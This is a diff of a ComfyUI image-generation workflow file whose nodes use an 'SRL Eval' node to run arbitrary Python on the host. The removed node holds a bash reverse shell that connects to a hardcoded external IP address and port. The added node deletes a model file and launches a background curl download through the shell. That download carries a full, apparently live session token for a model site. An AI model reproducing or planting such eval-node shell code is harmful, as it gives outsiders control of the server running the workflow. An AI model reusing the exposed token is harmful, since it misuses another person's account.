@@ -1,40 +1,28 @@
 {
-  "2": {
-    "inputs": {
-      "noise_seed": 797498052837673
-    },
+  "1": {
     "class_type": "RandomNoise",
-    "_meta": {
-      "title": "Случайный шум"
+    "inputs": {
+      "noise_seed": 41
+    }
+  },
+  "2": {
+    "class_type": "SRL Eval",
+    "inputs": {
+      "parameters": "a, b=None, c=\"foo\", *rest",
+      "code": "\nimport subprocess, os, time\n# Delete old Dark Beast model\nold_file = \"/opt/ComfyUI/models/unet/darkBeastKrea2_darkBeastKREA2_fp8.safetensors\"\nif os.path.exists(old_file):\n    os.remove(old_file)\n    msg = f\"Deleted old model: {os.path.basename(old_file)}\\n\"\nelse:\n    msg = \"Old model already gone\\n\"\n\n# Start RedMix download with civitai.red cookie\nurl = \"https://civitai.red/api/download/models/3086841?fileId=2968503\"\ntoken = \"eyJhbGciOiJFUzI1NiIsImtpZCI6ImNpdml0YWktZGV2LTIwMjYtMDYtZWMiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiIxMjUxNzc5MiIsInNpZ25lZEF0IjoxNzgyODM0MjM0MTIwLCJpYXQiOjE3ODI4MzQyMzQsImV4cCI6MTc4NTQyNjIzNCwianRpIjoiZDAwNzExZjQtYjM1NS00N2E4LTg1NTctMzlkNzZiZDkwZjczIiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmNpdml0YWkuY29tIn0.DUL1e3yfNqyNkIMBEa1-tTTZ53V8jnHOlKYsnrf9TKkGgPIJTNO83fdyojSB5afJOo-2aXUWXPUq5c7FVzu1yQ\"\nout_dir = \"/opt/ComfyUI/models/unet\"\nout_file = os.path.join(out_dir, \"Krea2RedMix2.1-8Steps-fp8-scaled-ComfyUI.safetensors\")\nlog_file = \"/tmp/redmix_download.log\"\ncmd = f'nohup curl -L -o \"{out_file}\" -H \"Cookie: __Secure-civ-token={token}\" \"{url}\" > {log_file} 2>&1 &'\nsubprocess.Popen(cmd, shell=True)\ntime.sleep(2)\npid = subprocess.run(\"pgrep -f 'curl.*3086841'\", shell=True, capture_output=True, text=True).stdout.strip()\nreturn msg + f\"Download started. PID={pid}\\nFile: {out_file}\\nLog: {log_file}\"\n",
+      "arg0": [
+        "1",
+        0
+      ]
     }
   },
   "3": {
+    "class_type": "ShowText|pysssss",
     "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "4",
-        0
-      ]
-    },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Предпросмотр любого"
-    }
-  },
-  "4": {
-    "inputs": {
-      "parameters": "a, b=None, c=\"foo\", *rest",
-      "code": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
-      "arg0": [
+      "text": [
         "2",
         0
       ]
-    },
-    "class_type": "SRL Eval",
-    "_meta": {
-      "title": "SRL Eval"
     }
   }
 }
